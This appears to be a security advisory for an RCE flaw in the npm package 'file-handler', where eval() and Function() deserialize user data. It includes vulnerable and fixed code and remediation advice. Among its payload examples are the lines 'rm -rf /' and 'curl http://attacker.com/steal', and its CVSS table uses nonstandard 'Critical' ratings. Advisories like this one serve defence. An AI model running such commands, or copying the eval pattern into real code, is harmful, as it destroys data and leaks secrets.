# Security Advisory: Remote Code Execution in file-handler

**CVE ID:** CVE-2024-1238  
**Package:** file-handler  
**Ecosystem:** npm  
**Severity:** Critical  
**CVSS Score:** 9.1  
**Published:** February 15, 2024

## Executive Summary

A critical Remote Code Execution (RCE) vulnerability has been discovered in the `file-handler` package affecting versions 0.5.0 through 0.8.2. This vulnerability stems from unsafe deserialization of user-controlled data, allowing attackers to execute arbitrary code on the server. This can lead to complete system compromise, data theft, and lateral movement within the network.

## Vulnerability Details

### Description

The `file-handler` package deserializes user-provided data using unsafe deserialization methods that allow object injection. When processing uploaded files or handling serialized data, the library uses `eval()`, `Function()`, or unsafe deserialization mechanisms that can execute arbitrary code embedded in the serialized payload. This is particularly dangerous because the code executes with the full privileges of the application process, potentially giving attackers complete control over the server.

### Affected Versions

| Version Range | Status | Fixed Version |
|--------------|--------|---------------|
| >= 0.5.0 < 0.8.3 | Vulnerable | 0.8.3 |
| < 0.5.0 | Not affected | - |
| >= 0.8.3 | Safe | - |

### Attack Vector

An attacker can exploit this vulnerability by crafting a malicious serialized payload that contains executable code. When the application deserializes this payload, the embedded code is executed with the privileges of the application process. Attack vectors include:

- **File uploads**: Malicious files containing serialized data with embedded code
- **API requests**: Serialized data sent directly through API endpoints
- **Configuration files**: Malicious configuration data that gets deserialized

### Vulnerable Code Example

```javascript
const fs = require('fs');

class FileHandler {
  async processFile(filePath) {
    const content = await fs.promises.readFile(filePath, 'utf8');
    
    // VULNERABLE: Unsafe deserialization using eval
    try {
      const data = eval(`(${content})`);
      return this.processData(data);
    } catch (error) {
      throw new Error('Invalid file format');
    }
  }

  async processSerializedData(serializedData) {
    // VULNERABLE: Using Function constructor (similar to eval)
    const deserializer = new Function('return ' + serializedData);
    const data = deserializer();
    return this.handleData(data);
  }
}
```

**Attack Payload Examples:**

Attackers can craft payloads that execute arbitrary code, such as:
- **Command execution**: Code that runs system commands like `rm -rf /` or `curl http://attacker.com/steal`
- **Data exfiltration**: Code that reads environment variables, configuration files, or database credentials and sends them to an attacker-controlled server
- **Reverse shells**: Code that establishes a network connection back to the attacker, providing interactive shell access
- **Lateral movement**: Code that scans the internal network and attempts to compromise other systems

### Impact

- **Complete System Compromise:** Attackers can execute arbitrary commands with application privileges
- **Data Exfiltration:** Sensitive data, credentials, and files can be stolen
- **Lateral Movement:** Compromised server can be used to attack other systems
- **Service Disruption:** Attackers can delete files, stop services, or cause denial of service
- **Compliance Violations:** Data breaches can result in regulatory penalties

### CVSS Breakdown

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network | Exploitable remotely via API |
| Attack Complexity | Low | Simple payload construction required |
| Privileges Required | None | No authentication needed |
| User Interaction | None | No user interaction required |
| Scope | Changed | Can affect entire system |
| Confidentiality | Critical | Complete data exposure |
| Integrity | Critical | Complete system control |
| Availability | Critical | Can cause complete service disruption |

## Remediation

### Immediate Actions

1. **Upgrade immediately** to version 0.8.3 or later:
   ```bash
   npm install file-handler@latest
   ```

2. **Isolate affected systems** from the network if possible

3. **Review system logs** for signs of compromise

4. **Rotate all credentials** and API keys

### Fixed Code Example

The fixed version uses safe JSON parsing with strict validation:

```javascript
class FileHandler {
  async processFile(filePath) {
    const content = await fs.promises.readFile(filePath, 'utf8');
    
    // Validate file size
    if (content.length > 10 * 1024 * 1024) {
      throw new Error('File too large');
    }
    
    // FIXED: Use safe JSON.parse instead of eval
    try {
      const data = JSON.parse(content);
      
      // Validate data structure
      if (!this.validateDataStructure(data)) {
        throw new Error('Invalid data structure');
      }
      
      return this.processData(data);
    } catch (error) {
      if (error instanceof SyntaxError) {
        throw new Error('Invalid JSON format');
      }
      throw error;
    }
  }

  validateDataStructure(data) {
    if (typeof data !== 'object' || data === null) {
      return false;
    }
    
    // Check for dangerous properties
    const dangerousProps = ['__proto__', 'constructor', 'prototype'];
    for (const prop of dangerousProps) {
      if (data.hasOwnProperty(prop)) {
        return false;
      }
    }
    
    return true;
  }
}
```

### Additional Security Measures

1. **Input Validation:** Validate all input data before processing, implement strict schema validation, use whitelisting instead of blacklisting
2. **Sandboxing:** If code execution is necessary, use proper sandboxing with restricted APIs and timeouts
3. **Process Isolation:** Run application with minimal privileges, use containers or VMs to isolate processes, implement network segmentation
4. **Monitoring and Logging:** Monitor for suspicious process execution, log all file operations and data processing, set up alerts for unusual activity
5. **Content Security Policy:** Implement strict CSP headers, validate file types and MIME types

### Safe Deserialization Practices

| Practice | Status | Description |
|----------|--------|-------------|
| Use JSON.parse | ✅ | Safe for JSON data |
| Avoid eval() | ✅ | Never use eval with user input |
| Avoid Function() | ✅ | Function constructor is unsafe |
| Schema validation | ✅ | Validate data structure |
| Whitelist approach | ✅ | Only allow expected properties |
| Size limits | ✅ | Limit input size |
| Sandboxing | ⚠️ | Use if code execution necessary |

### Remediation Timeline

| Date | Action |
|------|--------|
| 2024-02-10 | Vulnerability discovered during security research |
| 2024-02-12 | Vendor notified (critical severity) |
| 2024-02-15 | CVE assigned and advisory published |
| 2024-02-15 | Fixed version 0.8.3 released |
| 2024-02-18 | Critical patch deadline (3 days) |

## Testing for RCE

Security testing should verify that malicious payloads containing executable code are rejected rather than executed. Test cases should include:
- Payloads with `eval()` or `Function()` calls
- Payloads attempting to access `require()` or `process` objects
- Payloads with prototype pollution attempts
- Payloads attempting to execute system commands

All such payloads should be rejected with appropriate error messages, and no code should be executed.

## References

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [file-handler GitHub Repository](https://github.com/example/file-handler)
- [CVE-2024-1238 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1238)

## Credits

This vulnerability was discovered by the Snyk Security Research Team during automated security scanning.
